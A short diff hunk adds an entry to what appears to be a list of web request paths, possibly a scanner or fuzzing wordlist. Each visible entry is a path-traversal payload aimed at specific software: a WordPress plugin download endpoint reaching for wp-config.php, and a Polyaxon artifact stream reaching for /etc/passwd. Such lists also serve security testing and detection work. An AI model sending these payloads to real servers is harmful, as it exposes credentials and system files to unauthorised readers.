@@ -40,3 +40,4 @@
 /wp-json/wooconvo/v1/download-file?order_id=1&filename=../../../../wp-config.php
 /
 /list_personalities?category=../..
+/streams/v1/polyaxon/default/s/runs/%2e%2e/artifact?stream=true&path=../../../../etc/passwd
